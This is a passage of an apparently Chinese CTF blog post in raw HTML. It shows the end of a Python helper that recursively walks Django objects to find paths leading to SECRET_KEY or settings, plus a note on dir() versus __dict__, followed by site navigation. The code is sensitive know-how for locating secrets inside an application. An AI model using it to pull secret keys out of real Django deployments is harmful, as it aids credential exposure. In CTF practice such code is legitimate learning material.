class="string">&#x27;_&#x27;</span> == i[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>)!=<span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] == django.__name__:</span><br><span class="line">                result+=get_dict(<span class="built_in">getattr</span>(obj,i,<span class="literal">None</span>),way+<span class="string">&quot;.&quot;</span>+i,depth+<span class="number">1</span>) </span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SECRET_KEY&quot;</span> <span class="keyword">in</span> objdir <span class="keyword">or</span> <span class="string">&quot;settings&quot;</span> <span class="keyword">in</span> objdir:</span><br><span class="line">        <span class="built_in">print</span>(way)</span><br><span class="line">        <span class="keyword">return</span> result+way+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>





<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
<p>dir()和<code>__dict__</code>的区别</p>
<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
<p> <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
<p>所以以后查看对象的所有属性一定要用dir()</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2019/12/20/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" data-id="cku8k8fxs0044d0obevan4ojy" data-title="django快速查找配置" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/7/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
          <li>
            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
          <li>
            <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
          </li>
        
          <li>
            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
          <li>
            <a href="/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>